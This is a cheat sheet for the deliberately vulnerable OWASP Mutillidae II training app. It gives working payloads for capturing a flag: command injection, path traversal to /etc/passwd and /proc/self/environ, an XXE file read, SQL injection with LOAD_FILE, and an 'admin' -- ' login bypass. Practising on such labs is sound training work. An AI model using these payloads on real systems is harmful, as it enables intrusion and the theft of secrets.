# OWASP Mutillidae II

If you see a DB error: `/set-up-database.php`. Menu → OWASP 2017/2013 → pick a lab. Security
level toggle in the header (0 = no protection). Hints toggle shows lab help.

## Fastest route to the flag (env var)
| Lab | Payload |
|---|---|
| DNS Lookup (`index.php?page=dns-lookup.php`) — OS command injection | `127.0.0.1; env` / `127.0.0.1 && cat /proc/self/environ` |
| Local File Inclusion (`index.php?page=`) | `index.php?page=/proc/self/environ`, `?page=../../../../etc/passwd` |
| Text File Viewer / Source Viewer | change the `textfile`/`phpfile` value to `/proc/self/environ` |
| XML Validator (XXE) | `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///proc/self/environ">]><x>&e;</x>` |
| SQLi (User Info `user-info.php`) | `' UNION SELECT null,LOAD_FILE('/proc/self/environ'),null,...-- -` (match columns) |
| Login bypass | `admin' -- ` |

Generic notes: [cmdi](../05-injection/cmdi.md) · [lfi](../05-injection/lfi-path-traversal.md) ·
[xxe](../05-injection/xxe.md) · [union](../06-sqli/union-based.md) · [07-xss](../07-xss-client-side/README.md).
